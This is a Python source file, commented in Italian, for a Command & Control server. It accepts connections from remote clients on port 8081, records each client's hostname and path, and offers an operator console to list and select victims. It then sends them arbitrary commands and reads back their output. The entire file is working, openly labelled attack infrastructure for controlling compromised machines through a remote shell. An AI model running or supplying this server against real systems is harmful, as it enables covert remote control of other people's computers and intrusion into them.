import os
import socket
import threading
from datetime import datetime
from pathlib import Path

class ClientHandler:
    """Gestisce la singola connessione con un client."""
    def __init__(self, connection, address):
        self.conn = connection
        self.addr = address
        self.hostname = ""
        self.current_path = ""

    def send(self, data):
        self.conn.send(data.encode('utf-8'))

    def receive(self, buffer_size=4096):
        return self.conn.recv(buffer_size).decode('utf-8', errors="replace")

    def close(self):
        self.conn.close()


class C2Server:
    """Il nucleo del Server Command & Control."""
    def __init__(self, host='0.0.0.0', port=8081, max_conns=5):
        self.host = host
        self.port = port
        self.max_connections = max_conns
        
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}  # {id: ClientHandler}
        self.client_id_counter = 0
        self.selected_id = None
        
        # Lock per gestire l'accesso alla lista clients da più thread in sicurezza
        self.lock = threading.Lock()
        
        self.setup_directories()

    def setup_directories(self):
        """Crea le cartelle necessarie usando pathlib."""
        Path("../log").mkdir(exist_ok=True)
        Path("../conf").mkdir(exist_ok=True)

    def log(self, message):
        """Scrive i log su file."""
        log_path = Path(f"../log/server.log")
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(log_path, "a") as f:
            f.write(f"[{timestamp}] {message}\n")

    def start(self):
        """Avvia il server e il thread di ascolto."""
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_connections)
            
            # Thread per accettare nuove connessioni
            threading.Thread(target=self.accept_loop, daemon=True).start()
            
            print(f"[*] Server avviato su {self.host}:{self.port}")
            self.log("Server Started")
            self.terminal()
        except Exception as e:
            print(f"[!] Errore avvio server: {e}")

    def accept_loop(self):
        """Ciclo continuo per accettare client."""
        while True:
            conn, addr = self.server_socket.accept()
            
            with self.lock:
                if len(self.clients) < self.max_connections:
                    self.client_id_counter += 1
                    new_client = ClientHandler(conn, addr)
                    
                    # Ricezione handshake iniziale (es. hostname e path)
                    try:
                        data = new_client.receive().strip()
                        # Formato atteso dal client: "Path#Hostname"
                        if "#" in data:
                            new_client.current_path, new_client.hostname = data.split("#")
                        
                        self.clients[self.client_id_counter] = new_client
                        print(f"\n[+] Nuovo client connesso: {addr} (ID: {self.client_id_counter})")
                        self.log(f"Connected: {addr}")
                    except Exception as e:
                        print(f"[!] Errore handshake: {e}")
                        conn.close()
                else:
                    conn.close()

    def list_clients(self):
        """Mostra la lista dei client connessi."""
        print("\nID\tIndirizzo\t\tHostname")
        print("-" * 45)
        with self.lock:
            for cid, c in self.clients.items():
                print(f"{cid}\t{c.addr[0]}:{c.addr[1]}\t{c.hostname}")
        print("-" * 45)

    def terminal(self):
        """Interfaccia di comando principale."""
        while True:
            if not self.selected_id:
                cmd = input("\nC2-Server > ").strip().lower()
            else:
                target = self.clients[self.selected_id]
                cmd = input(f"[{self.selected_id}] {target.hostname}@{target.current_path} > ").strip()

            if cmd in ['exit', 'quit']:
                break
            elif cmd == 'list':
                self.list_clients()
            elif cmd.startswith('select '):
                try:
                    cid = int(cmd.split(' ')[1])
                    if cid in self.clients:
                        self.selected_id = cid
                    else:
                        print("[!] ID non valido.")
                except: print("[!] Uso: select <id>")
            elif cmd == 'back':
                self.selected_id = None
            elif self.selected_id:
                self.send_command(cmd)

    def send_command(self, cmd):
        """Invia comando al client selezionato e gestisce la risposta."""
        target = self.clients[self.selected_id]
        try:
            target.send(cmd)
            if cmd == 'cclose':
                with self.lock:
                    del self.clients[self.selected_id]
                self.selected_id = None
                return

            # Ricezione output (gestione semplificata per esempio)
            response = target.receive()
            if "#path#" in response:
                output, path = response.split("#path#")
                target.current_path = path
                print(output)
            else:
                print(response)
        except Exception as e:
            print(f"[!] Connessione persa con ID {self.selected_id}: {e}")
            with self.lock:
                del self.clients[self.selected_id]
            self.selected_id = None

if __name__ == "__main__":
    server = C2Server()
    server.start()
